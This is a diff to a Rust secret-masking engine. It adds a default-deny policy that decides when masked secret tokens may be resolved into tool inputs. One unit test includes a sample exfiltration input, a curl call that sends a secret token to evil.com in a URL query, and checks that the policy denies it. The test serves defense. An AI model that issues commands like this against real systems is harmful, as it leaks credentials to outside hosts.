@@ -6,6 +6,7 @@
 //! vs unmask. This crate is runtime-free (synchronous); the proxy calls it from
 //! async handlers.
 
+mod broker;
 mod cache;
 mod config;
 mod detect;
@@ -23,6 +24,7 @@ pub use config::{
     MlConfig, Operator, Profile, Quantization, RevealMarker, SaltScope,
 };
 pub use error::EngineError;
+pub use broker::{BrokerAllow, BrokerDecision, BrokerPolicy, DenyReason, DestRule};
 pub use manifest::{ManifestEntry, MaskOutcome, MaskStats, UnmaskManifest};
 pub use secrets::{SecretRule, SecretValue};
 pub use store::{Revealed, TokenKind};
@@ -245,6 +247,10 @@ pub struct MaskEngine {
     /// monitor. Hot-swappable `Arc` like `policy`, so determinism survives a secret
     /// swap (already-minted broker tokens keep resolving).
     secrets: RwLock<Arc<SecretSet>>,
+    /// Broker resolution policy (default-deny). Held OFF `EngineConfig` like
+    /// `secrets`; consulted only at the tool-input boundary by
+    /// [`MaskEngine::broker_resolve_pointers`]. Hot-swappable.
+    broker_policy: RwLock<Arc<BrokerPolicy>>,
 }
 
 impl MaskEngine {
@@ -295,6 +301,7 @@ impl MaskEngine {
             cache: DetectionCache::new(cache_cap),
             ml_gate: Mutex::new(()),
             secrets: RwLock::new(Arc::new(SecretSet::empty())),
+            broker_policy: RwLock::new(Arc::new(BrokerPolicy::default())),
         })
     }
 
@@ -388,6 +395,41 @@ impl MaskEngine {
             .expect("secrets rwlock poisoned")
             .compiled
             .len()
+    }
+
+    /// Install (hot-swap) the broker policy (default-deny base + allow rules).
+    pub fn set_broker_policy(&self, policy: BrokerPolicy) {
+        let mut slot = self
+            .broker_policy
+            .write()
+            .expect("broker_policy rwlock poisoned");
+        *slot = Arc::new(policy);
+    }
+
+    /// Resolve broker tokens in a tool-input JSON value at the LOCAL tool boundary
+    /// (T2/T3), gated by the broker policy. Walks every string leaf (tracking its
+    /// RFC-6901 pointer); for each `[BROKER__…]` token it reveals the value + the
+    /// registered secret name from the store and asks the policy whether it may
+    /// resolve into `(secret, tool, pointer, leaf)`. Allowed tokens are spliced to
+    /// their real value IN PLACE; denied / unknown ones are left tokenized. PII tokens
+    /// are untouched (PII is resolved earlier, on the wire). Returns a report
+    /// (resolved count + per-pointer denials) — never the values.
+    pub fn broker_resolve_pointers(
+        &self,
+        tool: &str,
+        input: &mut serde_json::Value,
+    ) -> BrokerResolveReport {
+        let policy = Arc::clone(
+            &self
+                .broker_policy
+                .read()
+                .expect("broker_policy rwlock poisoned"),
+        );
+        let store = self.store.lock().expect("store mutex poisoned");
+        let mut report = BrokerResolveReport::default();
+        let mut pointer = String::new();
+        broker_walk(input, &mut pointer, tool, &policy, &store, &mut report);
+        report
     }
 
     /// Number of distinct tokens minted so far this session.
@@ -893,6 +935,110 @@ impl MaskEngine {
         let store = self.store.lock().expect("store mutex poisoned");
         (*store.key(), *store.salt())
     }
+}
+
+/// Outcome of [`MaskEngine::broker_resolve_pointers`]: how many broker tokens were
+/// resolved, and the per-pointer denials (reason only — never a value).
+#[derive(Clone, Debug, Default)]
+pub struct BrokerResolveReport {
+    pub resolved: usize,
+    pub denied: Vec<(String, DenyReason)>,
+}
+
+/// Recursively walk a tool-input JSON value, resolving allowed broker tokens in each
+/// string leaf (tracking the RFC-6901 `pointer`).
+fn broker_walk(
+    v: &mut serde_json::Value,
+    pointer: &mut String,
+    tool: &str,
+    policy: &BrokerPolicy,
+    store: &SessionStore,
+    report: &mut BrokerResolveReport,
+) {
+    use serde_json::Value;
+    match v {
+        Value::String(s) => {
+            if let Some(new) = broker_resolve_leaf(s, tool, pointer, policy, store, report) {
+                *s = new;
+            }
+        }
+        Value::Array(arr) => {
+            for (i, item) in arr.iter_mut().enumerate() {
+                let len = pointer.len();
+                pointer.push('/');
+                pointer.push_str(&i.to_string());
+                broker_walk(item, pointer, tool, policy, store, report);
+                pointer.truncate(len);
+            }
+        }
+        Value::Object(map) => {
+            for (k, item) in map.iter_mut() {
+                let len = pointer.len();
+                pointer.push('/');
+                pointer.push_str(&rfc6901_escape(k));
+                broker_walk(item, pointer, tool, policy, store, report);
+                pointer.truncate(len);
+            }
+        }
+        _ => {}
+    }
+}
+
+/// RFC-6901 token escaping: `~` → `~0`, `/` → `~1`.
+fn rfc6901_escape(k: &str) -> String {
+    k.replace('~', "~0").replace('/', "~1")
+}
+
+/// Resolve allowed broker tokens in a single string leaf. Returns the rewritten leaf
+/// (with allowed tokens spliced to their values) or `None` if nothing changed. The
+/// policy decision uses the ORIGINAL leaf (so the destination host is parsed before
+/// any substitution).
+fn broker_resolve_leaf(
+    leaf: &str,
+    tool: &str,
+    pointer: &str,
+    policy: &BrokerPolicy,
+    store: &SessionStore,
+    report: &mut BrokerResolveReport,
+) -> Option<String> {
+    let re = token_regex();
+    let mut subs: Vec<(std::ops::Range<usize>, String)> = Vec::new();
+    let mut saw_broker = false;
+    for m in re.find_iter(leaf) {
+        let tok = m.as_str();
+        if !is_broker_token(tok) {
+            continue;
+        }
+        saw_broker = true;
+        match store.reveal_for(tok, TokenKind::Broker) {
+            Some(rev) => {
+                let name = rev.secret_name.as_deref().unwrap_or("");
+                match policy.decide(name, tool, pointer, leaf) {
+                    BrokerDecision::Resolve => {
+                        subs.push((m.range(), rev.value));
+                        report.resolved += 1;
+                    }
+                    BrokerDecision::Deny(reason) => {
+                        report.denied.push((pointer.to_string(), reason));
+                    }
+                }
+            }
+            // Unknown / expired / tombstoned broker token: leave it, count as denied.
+            None => report
+                .denied
+                .push((pointer.to_string(), DenyReason::NoRule)),
+        }
+    }
+    if !saw_broker || subs.is_empty() {
+        return None;
+    }
+    // Splice back-to-front so earlier byte ranges stay valid.
+    subs.sort_by(|a, b| b.0.start.cmp(&a.0.start));
+    let mut out = leaf.to_string();
+    for (range, value) in subs {
+        out.replace_range(range, &value);
+    }
+    Some(out)
 }
 
 /// Widen `[start, end)` outward to the nearest UTF-8 char boundaries (and clamp to
@@ -2113,6 +2259,64 @@ mod tests {
             "no overlapping leftover after resolve: {}",
             out.masked_text
         );
+    }
+
+    // Broker resolution at the tool boundary: an allowed (secret,tool,pointer,host)
+    // splices the real value; a wrong tool/host leaves the token in place.
+    #[test]
+    fn broker_resolve_pointers_respects_policy() {
+        let e = engine();
+        e.set_secret_rules(vec![secret_rule(
+            "db_password",
+            "pgpw-SECRET-1",
+            Operator::Broker,
+        )])
+        .unwrap();
+        // Mint the broker token by masking text containing the value.
+        let masked = e
+            .mask("conn pgpw-SECRET-1 here", Surface::UserMessage)
+            .unwrap();
+        let tok = token_regex()
+            .find(&masked.masked_text)
+            .expect("broker token minted")
+            .as_str()
+            .to_string();
+        assert!(tok.starts_with("[BROKER__DB_PASSWORD_"));
+
+        e.set_broker_policy(BrokerPolicy {
+            allow: vec![
+                BrokerAllow::new(
+                    Some("db_password"),
+                    "psql",
+                    "/connection_uri",
+                    Some(DestRule::HostAllowList(vec!["db.internal".into()])),
+                    None,
+                )
+                .unwrap(),
+            ],
+        });
+
+        // Allowed: psql → db.internal.
+        let mut input =
+            serde_json::json!({ "connection_uri": format!("postgres://u:{tok}@db.internal/d") });
+        let report = e.broker_resolve_pointers("psql", &mut input);
+        assert_eq!(report.resolved, 1);
+        let uri = input["connection_uri"].as_str().unwrap();
+        assert!(uri.contains("pgpw-SECRET-1"), "allowed value spliced: {uri}");
+        assert!(!uri.contains("BROKER__"));
+
+        // Denied: wrong tool (curl) to evil.com → token left in place, no value.
+        let mut input2 = serde_json::json!({ "url": format!("https://evil.com/?x={tok}") });
+        let report2 = e.broker_resolve_pointers("curl", &mut input2);
+        assert_eq!(report2.resolved, 0);
+        let url = input2["url"].as_str().unwrap();
+        assert!(url.contains("BROKER__"), "denied token left tokenized: {url}");
+        assert!(!url.contains("pgpw-SECRET-1"));
+
+        // Egress boundary: even a matching value into an MCP tool is denied.
+        let mut input3 = serde_json::json!({ "connection_uri": format!("x{tok}") });
+        let report3 = e.broker_resolve_pointers("mcp__db", &mut input3);
+        assert_eq!(report3.resolved, 0);
     }
 
     #[test]
